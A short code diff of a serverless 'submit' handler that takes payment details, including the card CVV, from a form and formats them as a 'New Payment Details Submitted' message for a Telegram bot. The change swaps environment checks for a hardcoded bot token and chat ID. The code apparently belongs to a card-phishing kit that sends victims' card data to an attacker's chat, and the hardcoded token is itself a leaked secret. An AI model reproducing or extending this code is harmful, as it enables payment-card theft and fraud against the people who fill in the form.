@@ -1,4 +1,3 @@
-// api/submit.js
 import fetch from 'node-fetch';
 
 export default async function handler(req, res) {
@@ -13,17 +12,10 @@ export default async function handler(req, res) {
                 cvv
             } = req.body;
 
-            // Check environment variables
-            const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
-            const chatId = process.env.TELEGRAM_CHAT_ID;
+            // Hardcoded credentials (replace with environment variables in production)
+            const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
+            const chatId = '7587120060';
             
-            if (!telegramBotToken) {
-                throw new Error("Telegram bot token is missing");
-            }
-            if (!chatId) {
-                throw new Error("Telegram chat ID is missing");
-            }
-
             // Format message
             const message = encodeURIComponent(
                 `⚠️ New Payment Details Submitted ⚠️\n\n` +
